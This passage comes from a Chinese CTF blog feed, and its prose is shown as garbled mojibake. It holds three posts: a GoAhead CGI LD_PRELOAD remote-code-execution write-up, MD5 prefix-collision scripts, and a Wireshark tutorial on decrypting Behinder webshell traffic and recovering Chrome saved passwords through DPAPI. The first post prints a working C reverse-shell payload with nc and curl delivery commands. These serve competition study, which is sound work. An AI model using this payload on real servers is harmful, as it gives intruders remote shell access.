<p>æˆ‘ä»¬å¯ä»¥æŒ‡å®šLD_PRELOAD=/proc/self/fd/0ï¼Œå› ä¸º/proc/self/fd/0æ˜¯æ ‡å‡†è¾“å…¥ï¼Œè€Œåœ¨CGIç¨‹åºä¸­ï¼ŒPOSTæ•°æ®æµå³ä¸ºæ ‡å‡†è¾“å…¥æµã€‚æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå°†å…¶æ”¾åœ¨POST Bodyä¸­ï¼Œå‘é€ç»™<a href="https://link.jianshu.com?t=http%3A%2F%2Ftarget%2Fcgi-bin%2Findex%3FLD_PRELOAD%3D%2Fproc%2Fself%2Ffd%2F0" target="_blank" rel="noopener">http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0</a>ï¼ŒCGIå°±ä¼šåŠ è½½æˆ‘ä»¬å‘é€çš„åŠ¨æ€é“¾æ¥åº“ï¼Œé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p>
<h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>æ¼æ´äº§ç”Ÿäºgoahead/src/cgi.c:cgiHandlerä¸­ï¼Œç¨‹åºéå†äº†ç”¨æˆ·è®¿é—®æ—¶æ‰€å¸¦çš„å‚æ•°ï¼ŒéªŒè¯å¦‚æœå‚æ•°ä¸ä¸ºREMOTE_HOSTæˆ–HTTP_AUTHORIZATIONï¼Œåˆ™å°†å…¶å­˜å‚¨è‡³envpæ•°ç»„ã€‚<br> è¯¥æ•°ç»„å°†ä½œä¸ºæ¥ä¸‹æ¥cgiè°ƒç”¨çš„ç¯å¢ƒå˜é‡ã€‚å¯ä»¥çœ‹å‡ºæ­£æ˜¯è¿™é‡Œå¯¹äºå‚æ•°çš„è¿‡æ»¤ä¸å…¨ï¼Œå¯¼è‡´äº†ç”¨æˆ·å¯ä»¥ä¿®æ”¹CGIç¨‹åºçš„LD_PRELOADç¯å¢ƒå˜é‡,è‡´ä½¿æ¼æ´å­˜åœ¨ã€‚</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ç¼–å†™payload.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">attacker_addr.sin_family = AF_INET;</span><br><span class="line">attacker_addr.sin_port = htons(<span class="number">1234</span>);</span><br><span class="line">attacker_addr.sin_addr.s_addr = inet_addr(<span class="string">"ipåœ°å€"</span>);</span><br><span class="line"><span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">1</span>);</span><br><span class="line">dup2(sock, <span class="number">2</span>);</span><br><span class="line">execve(<span class="string">"/bin/sh"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘åŠ¨æ€åº“(æ³¨æ„å’ŒæœåŠ¡å™¨ç¯å¢ƒç›¸ä¼¼)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109223215495.png" alt="image-20191109223215495"></p>
<p>ä¼šæŠ¥é”™ï¼Œä½†ä¸å½±å“ä½¿ç”¨</p>
<p>æœåŠ¡å™¨å…ˆç›‘å¬1234ç«¯å£</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109222241231.png" alt="image-20191109222241231"></p>
<p>ç„¶åæ‰§è¡Œpayload</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X POST --data-binary @payload.so http://183.129.189.62:13900/cgi-bin/index?LD_PRELOAD\=/proc/self/fd/0 -i | head</span><br></pre></td></tr></table></figure>

<p>æœåŠ¡é”™è¯¯å°±å¤šè¿è¡Œå‡ æ¬¡</p>
<p><img src="/2019/11/2019æ¹–æ¹˜æ¯webå¤ç°/image-20191109222659969.png" alt="image-20191109222659969"></p>
<p>å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>MD5Crack</title>
    <url>/2019/11/Md5Crack/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ç®€å•ç¢°æ’è„šæœ¬"><a href="#ç®€å•ç¢°æ’è„šæœ¬" class="headerlink" title="ç®€å•ç¢°æ’è„šæœ¬"></a>ç®€å•ç¢°æ’è„šæœ¬</h2><p>ä¸€ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span> ,<span class="number">1000000</span>):</span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(str(i))</span><br><span class="line">    s=md.hexdigest()</span><br><span class="line">    <span class="keyword">if</span> (s[<span class="number">0</span>:<span class="number">7</span>] == <span class="string">"721e123"</span>):</span><br><span class="line">        print(str(i))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><a id="more"></a>


<p>äºŒ:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ä½¿ç”¨æ–¹æ³•ï¼špython md5Crack.py "ä½ è¦ç¢°æ’çš„å­—ç¬¦ä¸²" å­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®</span></span><br><span class="line"><span class="string">ä¾‹å¦‚ï¼špython md5Crack.py â€œ0e" 0</span></span><br><span class="line"><span class="string">å°†äº§ç”ŸMD5å€¼ä¸º0eå¼€å¤´çš„å­—ç¬¦ä¸²ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.letters + string.digits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmp_md5</span><span class="params">(substr, stop_event, str_len,start=<span class="number">0</span>, size=<span class="number">20</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">''</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> range(size))</span><br><span class="line">        md51 = hashlib.md5(rnds)</span><br><span class="line">        value1 = md51.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value1[start: start+str_len] == substr:</span><br><span class="line"></span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            #ç¢°æ’å•MD5</span></span><br><span class="line"><span class="string">            print rnds</span></span><br><span class="line"><span class="string">            stop_event.set()</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="string">'''</span></span><br><span class="line"><span class="string">            #ç¢°æ’åŒmd5</span></span><br><span class="line"><span class="string">            md52 = hashlib.md5(value1)</span></span><br><span class="line"><span class="string">            if md52.hexdigest()[start: start+str_len] == substr:</span></span><br><span class="line"><span class="string">            	print rnds+ "=&gt;" + value1+"=&gt;"+ md52.hexdigest()  + "\n"</span></span><br><span class="line"><span class="string">                stop_event.set()</span></span><br><span class="line"><span class="string">            '''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># ç¢°æ’ä¸‰MD5</span></span><br><span class="line">            md52 = hashlib.md5(value1)</span><br><span class="line">            value2 = md52.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> value2[start: start + str_len] == substr:</span><br><span class="line">                md53 = hashlib.md5(value2)</span><br><span class="line">                <span class="keyword">if</span> md53.hexdigest()[start: start + str_len] == substr:</span><br><span class="line">                    <span class="keyword">print</span> rnds + <span class="string">"=&gt;"</span> + value1 + <span class="string">"=&gt;"</span> +value2+<span class="string">"=&gt;"</span>+ md53.hexdigest() + <span class="string">"\n"</span></span><br><span class="line">                    stop_event.set()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = int(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = len(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> range(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>

<p><a href="https://www.k2zone.cn/?p=2019" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>MD5</tag>
        <tag>Crack</tag>
      </tags>
  </entry>
  <entry>
    <title>wireshark</title>
    <url>/2019/11/wireshark/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ä¸€ã€å¿«æ·é”®"><a href="#ä¸€ã€å¿«æ·é”®" class="headerlink" title="ä¸€ã€å¿«æ·é”®"></a>ä¸€ã€å¿«æ·é”®</h2><p>Ctrl+M æ ‡è®°/å–æ¶ˆæ ‡è®°<br> shift+ctrl+N/B ä¸‹/ä¸Šä¸€ä¸ªè¢«æ ‡è®°çš„æ•°æ®åŒ…</p><h2 id="äºŒã€è¿‡æ»¤å™¨è¯­æ³•"><a href="#äºŒã€è¿‡æ»¤å™¨è¯­æ³•" class="headerlink" title="äºŒã€è¿‡æ»¤å™¨è¯­æ³•"></a>äºŒã€è¿‡æ»¤å™¨è¯­æ³•</h2><h3 id="1-æ•è·è¿‡æ»¤å™¨çš„BPF-Berkeley-Packet-Filter-è¯­æ³•"><a href="#1-æ•è·è¿‡æ»¤å™¨çš„BPF-Berkeley-Packet-Filter-è¯­æ³•" class="headerlink" title="1.æ•è·è¿‡æ»¤å™¨çš„BPF(Berkeley Packet Filter)è¯­æ³•"></a>1.æ•è·è¿‡æ»¤å™¨çš„BPF(Berkeley Packet Filter)è¯­æ³•</h3><p>é™å®šè¯    è¯´æ˜                                                                  ä¾‹å­  </p><a id="more"></a>

<p>Type      æŒ‡å‡ºåå­—æˆ–æ•°å­—æ‰€ä»£è¡¨çš„æ„ä¹‰                         hostã€netã€port  </p>
<p>Dir         æŒ‡æ˜ä¼ è¾“æ–¹å‘æ˜¯å‰å¾€è¿˜æ˜¯æ¥è‡ªåå­—æˆ–æ•°å­—      srcã€dst  </p>
<p>Proto     é™å®šæ‰€è¦åŒ¹é…çš„åè®®                                        etherã€ipã€tcpã€udpã€httpã€ftp</p>
<p>ä½¿ç”¨BPFè¯­æ³•åˆ›å»ºçš„è¿‡æ»¤å™¨è¢«ç§°ä¸ºè¡¨è¾¾å¼ï¼Œæ¯ä¸ªè¡¨è¾¾å¼åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªåŸè¯­ã€‚æ¯ä¸ªåŸè¯­åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªé™å®šè¯ï¼Œç„¶åè·Ÿç€ä¸€ä¸ªIDåå­—æˆ–è€…æ•°å­—</p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string">&lt;----------åŸè¯­---------&gt;</span>|<span class="string">&lt;æ“ä½œç¬¦&gt;</span>|<span class="string">&lt;-----åŸè¯­----&gt;</span>|</span><br><span class="line"> dst   host   192.168.0.10   &amp;&amp;    tcp   port   80</span><br><span class="line">|<span class="string">é™å®šè¯</span>|<span class="string">é™å®šè¯</span>|<span class="string">&lt;----ID----&gt;</span>|<span class="string">      </span>|<span class="string">é™å®šè¯</span>|<span class="string">é™å®šè¯</span>|<span class="string">ID</span>|</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨3ä¸­é€»è¾‘è¿ç®—ç¬¦å¯¹åŸè¯­è¿›è¡Œç»„åˆ</p>
<ul>
<li>è¿æ¥è¿ç®—ç¬¦ &amp;&amp;</li>
<li>é€‰æ‹©è¿ç®—ç¬¦ ||</li>
<li>å¦å®šè¿ç®—ç¬¦ !</li>
</ul>
<p>ä¾‹ï¼š<br> <code>src 192.168.0.10 &amp;&amp; port 80</code><br> åªæ•è·æºåœ°å€æ˜¯192.168.0.10å’Œæºç«¯å£æˆ–ç›®çš„ç«¯å£æ˜¯80çš„æµé‡</p>
<p><code>ether host 00-1a-a0-52-e2-a0</code><br> æ ¹æ®MACåœ°å€æ•è·</p>
<h4 id="å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹"><a href="#å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹" class="headerlink" title="å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹"></a>å¸¸ç”¨æ•è·è¿‡æ»¤å™¨è¡¨è¾¾å¼æ ·ä¾‹</h4><p> è¿‡æ»¤å™¨                                      è¯´æ˜                        </p>
<p> tcp[13]&amp;32==32                                          è®¾ç½®URGä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;16==16                                          è®¾ç½®ACKä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;8==8                                              è®¾ç½®PSHä½çš„TCPæ•°æ®åŒ…<br>  tcp[13]&amp;4==4                                            è®¾ç½®RSTä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;2==2                                              è®¾ç½®SYNä½çš„TCPæ•°æ®åŒ…<br> tcp[13]&amp;1==1                                            è®¾ç½®FINä½çš„TCPæ•°æ®åŒ…<br> tcp[13]==18                                                 TCP SYN-ACKæ•°æ®åŒ…<br> ether host 00:00:00:00:00:00(ä½ çš„MACåœ°å€)       æµå…¥æˆ–æµå‡ºä½ MACåœ°å€çš„æµé‡<br> !ether host 00:00:00:00:00:00(ä½ çš„MACåœ°å€)     ä¸æµå…¥æˆ–æµå‡ºä½ MACåœ°å€çš„æµé‡<br> broadcast                                                    ä»…å¹¿æ’­æµé‡<br> icmp                                                           ICMPæµé‡<br> icmp[0:2]==0x0301                               ICMPç›®æ ‡ä¸å¯è¾¾ã€ä¸»æœºä¸å¯è¾¾<br> ip                                                                     ä»…IPv4æµé‡<br> ip6                                                               ä»…IPv6æµé‡<br> udp                                                         ä»…UDPæµé‡                   </p>
<h3 id="2-åè®®åŸŸè¿‡æ»¤å™¨"><a href="#2-åè®®åŸŸè¿‡æ»¤å™¨" class="headerlink" title="2.åè®®åŸŸè¿‡æ»¤å™¨"></a>2.åè®®åŸŸè¿‡æ»¤å™¨</h3><p>BPFè¯­æ³•è¿˜æä¾›äº†åè®®åŸŸè¿‡æ»¤å™¨ï¼Œå¯ä»¥åšæŒåè®®å¤´ä¸­çš„æ¯ä¸€å­—èŠ‚æ¥è¿‡æ»¤<br> ä¾‹ï¼š<br> <code>icmp[0]==3</code><br> è¿”å›icmpåŒ…çš„ç¬¬1ä¸ªå­—èŠ‚çš„æ•´å½¢å€¼æ¯”è¾ƒï¼Œåªæ•è·ä»£è¡¨ç›®æ ‡ä¸å¯è¾¾ä¿¡æ¯(ç±»å‹3)çš„ICMPæ•°æ®åŒ…</p>
<p><code>icmp[0:2]==0x0301</code><br> æ•è·æ‰€æœ‰ç±»å‹3ä»£ç 1è¡¨ç¤ºçš„ç›®æ ‡ä¸å¯è¾¾ã€ä¸»æœºä¸å¯è¾¾çš„ICMPæ•°æ®åŒ…</p>
<p><code>tcp[13]&amp;4==4</code><br> åªæ•è·å¸¦æœ‰RSTæ ‡å¿—çš„TCPæ•°æ®åŒ…(RSTæ ‡å¿—ä½åœ¨TCPåŒ…åç§»13å­—èŠ‚ï¼Œ00000100)</p>
<h3 id="3-æ˜¾ç¤ºè¿‡æ»¤å™¨"><a href="#3-æ˜¾ç¤ºè¿‡æ»¤å™¨" class="headerlink" title="3.æ˜¾ç¤ºè¿‡æ»¤å™¨"></a>3.æ˜¾ç¤ºè¿‡æ»¤å™¨</h3><p><a href="https://www.wireshark.org/docs/dfref/" target="_blank" rel="noopener">æ˜¾ç¤ºè¿‡æ»¤å™¨å‚è€ƒ</a></p>
<p>å¸¸ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨</p>
<p>è¿‡æ»¤å™¨                                  è¯´æ˜<br>!tcp.port==3389                 æ’é™¤RDPæµé‡<br>tcp.flags.syn==1                å…·æœ‰SYNæ ‡å¿—ä½çš„TCPæ•°æ®åŒ…<br>tcp.flags.rst==1                  å…·æœ‰RSTæ ‡å¿—ä½çš„TCPæ•°æ®åŒ…<br>!arp                                      æ’é™¤ARPæµé‡<br>http                                æ‰€æœ‰HTTPæµé‡<br>tcp.port==23 || tcp.port==21  æ–‡æœ¬ç®¡ç†æµé‡ï¼ˆTelnetæˆ–FTPï¼‰<br>smtp || pop || imap         æ–‡æœ¬emailæµé‡ï¼ˆSMTPã€POPæˆ–IMAPï¼‰ </p>
<h2 id="ä¸‰ã€å¯¼å‡ºå¯¹è±¡"><a href="#ä¸‰ã€å¯¼å‡ºå¯¹è±¡" class="headerlink" title="ä¸‰ã€å¯¼å‡ºå¯¹è±¡"></a>ä¸‰ã€å¯¼å‡ºå¯¹è±¡</h2><p>CTFç«èµ›ä¸­æœ€å¸¸è§çš„å°±æ˜¯HTTPåè®®äº†ï¼Œè€Œä¸”é€šä¿¡ä¸»æœºå°‘å®¹æ˜“åˆ†æã€‚</p>
<p>åˆ©ç”¨å¯¼å‡ºå¯¹è±¡å¯ä»¥å¿«é€Ÿçš„åˆ¤æ–­è¿™æ®µæµé‡åœ¨å¹²å˜›ã€‚</p>
<p><img src="/2019/11/wireshark/image-20191103145931434.png" alt="image-20191103145931434"></p>
<p>é€‰æ‹©HTTPâ€¦</p>
<p><img src="/2019/11/wireshark/image-20191103155828631.png" alt="image-20191103155828631"></p>
<p>å¾ˆæ¸…æ™°çš„å¯ä»¥çœ‹åˆ°httpè¯·æ±‚ã€‚</p>
<p>å¾ˆæ˜æ˜¾æ˜¯ä¸ªæ”»å‡»è€…å¯¹æœåŠ¡å™¨å‘èµ·äº†sqlæ³¨å…¥æ”»å‡»</p>
<p>æ ¹æ®å®ƒçš„HTTPè¯·æ±‚ï¼Œæ”»å‡»è€…è·å¾—äº†é‚£äº›æ•°æ®æˆ‘ä»¬åŒæ ·ä¹Ÿèƒ½å¾—åˆ°ã€‚</p>
<p>è€Œä¸”ä¼ è¾“è¿‡ç¨‹ä¸­çš„æ‰€æœ‰æ–‡ä»¶éƒ½èƒ½æˆªè·ã€‚</p>
<p><img src="/2019/11/wireshark/image-20191103170050584.png" alt="image-20191103170050584"></p>
<p>é€šè¿‡å³ä¸‹è§’çš„SAVAå¯ä»¥å®Œæ•´çš„ä¿å­˜ä¼ è¾“çš„æ–‡ä»¶ã€‚</p>
<h2 id="å››ã€å®æˆ˜"><a href="#å››ã€å®æˆ˜" class="headerlink" title="å››ã€å®æˆ˜"></a>å››ã€å®æˆ˜</h2><p>æµé‡åˆ†æå°±æ˜¯ä¸ªå¤§æ‚çƒ©ï¼Œä»€ä¹ˆéƒ½èƒ½åŠ ã€‚</p>
<p>æ¯”å¦‚phpè¯­è¨€ï¼Œhttpï¼Œtcp/ipåè®®ï¼Œå„ç§åŠ è§£å¯†ï¼Œéšå†™ï¼Œsqlæ³¨å…¥ç­‰ç­‰</p>
<p>3CTFå¤èµ›çš„ä¸€é“æµé‡åˆ†æé¢˜</p>
<p><a href="https://pan.baidu.com/s/1rLlbRyapHrTOWUc3BfVafQ" target="_blank" rel="noopener">ok.pcapng</a> æå–ç : 7y3a </p>
<p>å…ˆä½¿ç”¨ ç»Ÿè®¡-åè®®åˆ†çº§åŠŸèƒ½ï¼ŒæŸ¥çœ‹æµé‡åŒ…å…·ä½“çš„æœ‰å“ªäº›åè®®ã€‚</p>
<p><img src="/2019/11/wireshark/image-20191107184246441.png" alt="image-20191107184246441"></p>
<p>ç™¾åˆ†ä¹‹ä¹åä»¥ä¸Šæ˜¯TCPåè®®ã€‚</p>
<p>ç„¶åä½¿ç”¨ æ–‡ä»¶-å¯¼å‡ºå¯¹è±¡-HTTP æŸ¥çœ‹å…·ä½“çš„HTTPè¯·æ±‚å’Œæ˜¯å¦æœ‰æ–‡ä»¶ä¼ è¾“</p>
<p><img src="/2019/11/wireshark/image-20191107184812717.png" alt="image-20191107184812717"></p>
<p>ä»è¿™äº›HTTPè¯·æ±‚ä¸­ï¼Œåº”è¯¥æ˜¯é€šè¿‡upload.phpä¸Šä¼ äº†file_5d81f9f4d22d41.67475082.php</p>
<p>ç„¶åä¸€ç›´ä¸file_5d81f9f4d22d41.67475082.phpè¿›è¡Œäº¤äº’ã€‚</p>
<p>åˆ©ç”¨ è¿½è¸ªæµçš„åŠŸèƒ½æŸ¥çœ‹å®Œæ•´çš„æŠ¥æ–‡</p>
<p><img src="/2019/11/wireshark/image-20191107221151317.png" alt="image-20191107221151317"></p>
<p>é€‰æ‹©HTTPæµ</p>
<p><img src="/2019/11/wireshark/image-20191107221334510.png" alt="image-20191107221334510"></p>
<p>ä¸€ä¸ªæ ‡å‡†çš„å†°èé©¬</p>
<p>å†°èé©¬ä¼šå…ˆä»å®¢æˆ·ç«¯å¾—åˆ°ä¸€ä¸ªåŠ å¯†å¯†åŒ™ï¼Œç”¨äºæµé‡åŠ å¯†ã€‚</p>
<p><img src="/2019/11/wireshark/image-20191107222451205.png" alt="image-20191107222451205"></p>
<p>æˆ‘ä»¬è¿½è¸ªä¸€ä¸‹pass=790çš„æµé‡ã€‚è¿™é‡Œæˆ‘ä»¬é€‰æ‹©è¿½è¸ªTCPæµï¼Œæ–¹ä¾¿åé¢æŸ¥çœ‹å…¶ä»–æµ</p>
<p><img src="/2019/11/wireshark/image-20191107223755881.png" alt="image-20191107223755881"></p>
<p>å¾—åˆ°è§£å¯†å¯†åŒ™  <code>d59042be6e437849</code></p>
<p>è§£å¯†è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$post=<span class="string">''</span>; <span class="comment"># æ”¾å…¥ä½ è¦è§£å¯†çš„å†…å®¹</span></span><br><span class="line">$str=openssl_decrypt($post, <span class="string">"AES128"</span>, <span class="string">'d59042be6e437849'</span>);</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">fwrite($file,$str);</span><br><span class="line">fclose($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå‘ç°ç¬¬äºŒä¸ªæµçš„æœ€åä¸€ä¸ªæµé‡</p>
<p><img src="/2019/11/wireshark/image-20191111115823331.png" alt="image-20191111115823331"></p>
<p><img src="/2019/11/wireshark/image-20191111115909128.png" alt="image-20191111115909128"></p>
<p><img src="/2019/11/wireshark/image-20191111120005244.png" alt="image-20191111120005244"></p>
<p><img src="/2019/11/wireshark/image-20191107234940949.png" alt="image-20191107234940949"></p>
<p>å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä½†ç›®å‰ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨</p>
<p>åº”è¯¥åœ¨æµé‡åŒ…ä¸­è¿˜æœ‰æˆ‘ä»¬æ²¡æœ‰å‘ç°çš„ä¸œè¥¿</p>
<p>ä¸€ã€å¯ä»¥é€šè¿‡æœç´¢å…³é”®å­—çš„16è¿›åˆ¶ï¼ŒäºŒã€å¯ä»¥é€šè¿‡æŸ¥é˜…å®Œæ•´TCPæµã€‚</p>
<p>1.flagçš„16è¿›åˆ¶ä¸º <code>666c6167</code></p>
<p><img src="/2019/11/wireshark/image-20191107235545698.png" alt="image-20191107235545698"></p>
<p>ç¬¬521ä¸ªåŒ…</p>
<p>2.è°ƒæ•´æµï¼Œå¤§è‡´æµè§ˆæŠ¥æ–‡ã€‚</p>
<p>åœ¨ç¬¬8ä¸ªæµ ï¼Œå‘ç°äº†ä¸ä¸€æ ·çš„ä¸œè¥¿</p>
<p><img src="/2019/11/wireshark/image-20191107235710539.png" alt="image-20191107235710539"></p>
<p>é€šè¿‡å¯¼å‡ºå¯¹è±¡ï¼ŒæŠŠè¿™ä¸ªSQLiteæ–‡ä»¶å¯¼å‡º</p>
<p>ç„¶åè¿™é¢˜ä¸»è¦æ˜¯è§£å¯†<code>Chrome</code>æµè§ˆå™¨çš„ä¿å­˜å¯†ç çš„<code>Login Data</code>æ•°æ®åº“ï¼ˆå°±æ˜¯ä¸ªSQLIte3æ•°æ®åº“ï¼‰ï¼Œ</p>
<p>å¯ä»¥é€šè¿‡ç¦»çº¿çš„æ–¹å¼å¯¼å‡ºå¯†ç ã€‚éœ€è¦ä½¿ç”¨ç”¨æˆ·ç™»å½•å¯†ç è§£å¯†master key file è·å¾—master keyã€‚å†ç”¨master keyè§£å¯†DPAPI blob ã€‚<br> è§£è¿™é¢˜ä¸»è¦éœ€è¦æ˜æ–‡å¯†ç ã€<code>blob</code>ã€<code>master key</code>ã€‚ä¸»è¦æ˜¯322ï¼Œ524ï¼Œ654å·æ•°æ®åŒ…ï¼š</p>
<p>ä½¿ç”¨DB Browser for SQLiteæ‰“å¼€SQLiteæ–‡ä»¶</p>
<p><img src="/2019/11/wireshark/image-20191109230229511.png" alt="image-20191109230229511"></p>
<p>å¯¼å‡ºåŠ å¯†åçš„blob</p>
<p>åœ¨æœ€åä¸€ä¸ªæµä¸­(11)ï¼Œå‘ç°è¿”å›çš„å­—ç¬¦ä¸²å’Œä¹‹å‰çš„ä¸ä¸€æ ·ï¼Œ</p>
<p>è§£å¯†POSTåŒ…</p>
<p><img src="/2019/11/wireshark/image-20191109233659468.png" alt="image-20191109233659468"></p>
<p>å¾—åˆ°æ–‡ä»¶è·¯å¾„</p>
<p>è¿”å›çš„å¯†æ–‡å°±æ˜¯<code>master key</code></p>
<p><img src="/2019/11/wireshark/image-20191109231824174.png" alt="image-20191109231824174"></p>
<p>å¤åˆ¶åˆ°æ–‡ä»¶æˆ–è€…å¯¼å‡ºå¯¹è±¡</p>
<p>æœ€ååˆ©ç”¨ windows password recoveryæ¥è§£å¯† </p>
<p>(æ²¡æœ‰ windows password recoveryæ‰€ä»¥å›¾æ˜¯ç›—çš„<a href="https://blog.csdn.net/yh1013024906/article/details/102952104" target="_blank" rel="noopener">yyqx</a>å¤§ä½¬çš„)</p>
<p>  é€‰æ‹©Utils -&gt; DPAPI Decoder and Analyser -&gt; Decrypt DPAPI data blob <img src="/2019/11/wireshark/2019110711452061.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p>
<p> <img src="/2019/11/wireshark/20191107114526761.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p>
<p> <img src="/2019/11/wireshark/20191107114541741.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"> </p>
